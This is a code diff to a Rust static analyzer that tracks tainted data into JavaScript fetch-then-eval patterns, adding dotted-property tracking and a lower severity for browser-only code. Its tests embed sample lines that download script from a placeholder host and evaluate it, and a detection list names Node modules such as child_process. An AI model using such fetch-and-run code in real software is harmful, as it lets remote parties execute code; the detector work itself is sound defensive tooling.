@@ -590,14 +590,34 @@ impl<'a> Flow<'a> {
             return None;
         }
         let scope = self.resolve(&name, k);
-        self.names.get(&(name.into_owned(), scope)).cloned()
+        // `a` is tainted: so is `a.b.c`. `a.b` is tainted: so is `a.b.c`, but not
+        // `a.d` and not `a`.
+        let mut path = name.into_owned();
+        let mut at = k;
+        for _ in 0..5 {
+            if let Some(taint) = self.names.get(&(path.clone(), scope)) {
+                return Some(taint.clone());
+            }
+            if !self.punct(at + 1, b'.') {
+                break;
+            }
+            let Some(next) = self.name(at + 2) else {
+                break;
+            };
+            path.push('.');
+            path.push_str(&next);
+            at += 2;
+        }
+        None
     }
 
     /// Which variable named `name` the token `at` means: the scope that declares
     /// it and surrounds `at` most closely (the index of the token that starts
     /// the scope), `FILE_SCOPE` for a declaration at the top of the file, or
     /// `usize::MAX` for a global or an undeclared name.
-    fn resolve(&self, name: &str, at: usize) -> usize {
+    fn resolve(&self, path: &str, at: usize) -> usize {
+        // `a.b` is a property of the variable `a`.
+        let name = path.split('.').next().unwrap_or(path);
         let mut best: Option<usize> = None;
         if let Some(list) = self.decl_ranges.get(name) {
             let upto = list.partition_point(|range| range.0 <= at);
@@ -898,18 +918,24 @@ impl<'a> Flow<'a> {
         }
     }
 
-    /// The first name of the chain `a.b[c].d` that ends at `p`.
+    /// The path of the chain `a.b[c].d` that ends at `p`, as far as it is plain
+    /// names and dots (`a.b`), with the token of its first name.
     fn base_name(&self, mut p: usize) -> Option<Bound> {
+        let mut segments: Vec<String> = Vec::new();
         for _ in 0..100 {
             match self.kind(p) {
                 Some(Kind::Ident) => {
+                    segments.push(self.name(p)?.into_owned());
                     if p >= 2 && self.punct(p - 1, b'.') {
                         p -= 2;
                     } else {
-                        return self.name(p).map(|n| (n.into_owned(), p));
+                        segments.reverse();
+                        return Some((segments.join("."), p));
                     }
                 }
                 Some(Kind::Punct(b')' | b']')) => {
+                    // What follows an index or a call is not part of the path.
+                    segments.clear();
                     let open = self.partner(p)?;
                     if open == 0 {
                         return None;
@@ -1089,7 +1115,8 @@ impl<'a> Flow<'a> {
         }
         for (name, at) in names {
             let scope = self.resolve(name, *at);
-            self.tainted_names.insert(name.clone());
+            self.tainted_names
+                .insert(name.split('.').next().unwrap_or(name).to_string());
             let entry = self.names.entry((name.clone(), scope)).or_default();
             changed |= entry.merge(taint);
         }
@@ -1111,12 +1138,14 @@ impl<'a> Flow<'a> {
             }
             // `const run = eval;`
             if let [(name, _)] = names.as_slice()
+                && !name.contains('.')
                 && let Some(class) = self.sink_reference(j + 1)
             {
                 self.sink_alias.entry(name.clone()).or_insert(class);
             }
             // `const api = axios.create(...)`
             if let [(name, _)] = names.as_slice()
+                && !name.contains('.')
                 && self.is_net_factory(j + 1)
                 && self.net_alias.insert(name.clone())
             {
@@ -1494,6 +1523,7 @@ impl<'a> Flow<'a> {
             matches!(self.kind(k), Some(Kind::Str | Kind::Template))
                 && self.lx.raw(self.text, k).contains("://")
         });
+        let browser_only = self.browser_only();
         for (i, class, label, open) in sinks {
             let Some(close) = self.partner(open) else {
                 continue;
@@ -1522,10 +1552,16 @@ impl<'a> Flow<'a> {
                          elsewhere), which is how some honest test pages and tools do it, so \
                          the level is one lower",
                     );
+                } else if browser_only {
+                    reason.push_str(
+                        "; the file is browser code (it uses window or document and no Node.js \
+                         feature), where the browser limits what the code can do, so the level \
+                         is one lower",
+                    );
                 }
                 self.add(FoundKind::FetchEval, i, reason);
                 if let Some(found) = self.found.last_mut() {
-                    found.lowered = !remote_url;
+                    found.lowered = !remote_url || browser_only;
                 }
             } else if taint.bits & BLOB != 0 {
                 self.add(
@@ -1610,6 +1646,53 @@ impl<'a> Flow<'a> {
                 });
             }
         }
+    }
+
+    /// Whether the file is browser code: it uses `window` or `document` and
+    /// nothing that only Node.js has (`require`, `process`, `module.exports`,
+    /// `__dirname`, a built-in module). Code that can read files and start
+    /// programs is not limited by a browser, so it keeps the rule's level.
+    fn browser_only(&self) -> bool {
+        const NODE_MODULES: &[&str] = &[
+            "fs",
+            "path",
+            "os",
+            "child_process",
+            "http",
+            "https",
+            "net",
+            "crypto",
+            "vm",
+            "zlib",
+            "stream",
+            "util",
+            "url",
+            "module",
+        ];
+        let (mut dom, mut node) = (false, false);
+        for k in 0..self.n() {
+            match self.kind(k) {
+                Some(Kind::Ident) if self.is_reference(k) => match self.lx.raw(self.text, k) {
+                    "document" | "window" => dom = true,
+                    "require" | "process" | "__dirname" | "__filename" | "exports" | "module" => {
+                        node = true;
+                    }
+                    _ => {}
+                },
+                Some(Kind::Str) => {
+                    if let Some(value) = self.str_val(k)
+                        && (value.starts_with("node:") || NODE_MODULES.contains(&value.as_str()))
+                    {
+                        node = true;
+                    }
+                }
+                _ => {}
+            }
+            if node {
+                return false;
+            }
+        }
+        dom
     }
 
     fn function_require(
@@ -2016,6 +2099,29 @@ mod tests {
         assert!(kinds(text).is_empty(), "{:?}", kinds(text));
         let text = "const c = await fetch(u);\nnew vm.Script(c, { filename: 'x' });";
         assert_eq!(fetch_eval_count(text), 1);
+    }
+
+    #[test]
+    fn browser_code_is_one_level_lower_and_node_code_is_not() {
+        let page = "fetch('https://a.example.invalid/a.js').then(r => r.text()).then(c => { eval(c); document.title = 'x'; });";
+        assert!(flow(page)[0].lowered);
+        let server = "const fs = require('fs');\nfetch('https://a.example.invalid/a.js').then(r => r.text()).then(c => { eval(c); document.title = 'x'; });";
+        assert!(!flow(server)[0].lowered);
+        let neither =
+            "fetch('https://a.example.invalid/a.js').then(r => r.text()).then(c => { eval(c); });";
+        assert!(!flow(neither)[0].lowered);
+    }
+
+    #[test]
+    fn a_property_set_on_an_object_does_not_taint_the_object() {
+        // `Module.prototype._compile = tainted` must not make `Module.wrap(...)`
+        // tainted; the stored property itself still is.
+        let text = "const c = await fetch(u);\nModule.prototype._compile = c;\nvm.runInNewContext(Module.wrap(1));";
+        assert!(kinds(text).is_empty(), "{:?}", kinds(text));
+        let text = "const c = await fetch(u);\nthis.body = c;\neval(this.body);";
+        assert_eq!(fetch_eval_count(text), 1);
+        let text = "const c = await fetch(u);\nthis.body = c;\neval(this.other);";
+        assert_eq!(fetch_eval_count(text), 0);
     }
 
     #[test]
